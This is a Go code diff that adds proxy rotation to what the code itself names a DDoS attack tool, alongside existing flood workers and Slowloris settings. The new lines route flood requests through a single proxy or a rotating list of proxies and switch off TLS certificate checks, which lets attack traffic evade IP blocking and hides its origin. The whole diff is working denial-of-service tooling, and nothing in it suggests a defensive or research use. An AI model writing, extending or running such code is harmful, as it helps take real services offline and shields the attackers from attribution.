@@ -7,6 +7,7 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -43,6 +44,11 @@ type DDoSConfig struct {
 	// Slowloris specific
 	SlowlorisDelay time.Duration // Delay between partial header sends
 
+	// Proxy settings
+	UseProxy    bool     // Whether to use proxies
+	ProxyList   []string // List of proxy URLs (e.g., "http://1.2.3.4:8080")
+	RotateProxy bool     // Rotate through proxies for each request
+
 	// Callbacks
 	OnProgress func(stats AttackStats)
 }
@@ -75,6 +81,7 @@ type DDoSAttack struct {
 	bytesReceived     int64
 	activeConns       int64
 	totalResponseTime int64 // in nanoseconds
+	proxyIndex        int64 // Current proxy index for rotation
 
 	startTime time.Time
 	running   bool
@@ -248,6 +255,14 @@ func (d *DDoSAttack) startFloodWorkers(numWorkers int) {
 		}).DialContext,
 	}
 
+	// Configure proxy if enabled
+	if d.config.UseProxy && len(d.config.ProxyList) > 0 && !d.config.RotateProxy {
+		// Use first proxy for all requests
+		if parsedURL, err := url.Parse(d.config.ProxyList[0]); err == nil {
+			transport.Proxy = http.ProxyURL(parsedURL)
+		}
+	}
+
 	client := &http.Client{
 		Transport: transport,
 		Timeout:   d.config.Timeout,
@@ -306,6 +321,32 @@ func (d *DDoSAttack) sendRequest(client *http.Client) {
 	atomic.AddInt64(&d.activeConns, 1)
 	defer atomic.AddInt64(&d.activeConns, -1)
 
+	// Create a new client for proxy rotation if needed
+	actualClient := client
+	if d.config.UseProxy && d.config.RotateProxy && len(d.config.ProxyList) > 0 {
+		// Create a new transport with rotated proxy
+		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
+		proxyURL := d.config.ProxyList[int(idx)%len(d.config.ProxyList)]
+		if parsedURL, err := url.Parse(proxyURL); err == nil {
+			transport := &http.Transport{
+				TLSClientConfig: &tls.Config{
+					InsecureSkipVerify: true,
+				},
+				Proxy: http.ProxyURL(parsedURL),
+				DialContext: (&net.Dialer{
+					Timeout:   d.config.Timeout,
+					KeepAlive: 30 * time.Second,
+				}).DialContext,
+				DisableKeepAlives: !d.config.ReuseConnections,
+			}
+			actualClient = &http.Client{
+				Transport:     transport,
+				Timeout:       d.config.Timeout,
+				CheckRedirect: client.CheckRedirect,
+			}
+		}
+	}
+
 	var bodyReader io.Reader
 	if d.config.Body != "" {
 		bodyReader = strings.NewReader(d.config.Body)
@@ -337,7 +378,7 @@ func (d *DDoSAttack) sendRequest(client *http.Client) {
 	startTime := time.Now()
 	atomic.AddInt64(&d.requestsSent, 1)
 
-	resp, err := client.Do(req)
+	resp, err := actualClient.Do(req)
 	if err != nil {
 		atomic.AddInt64(&d.requestsFailed, 1)
 		return
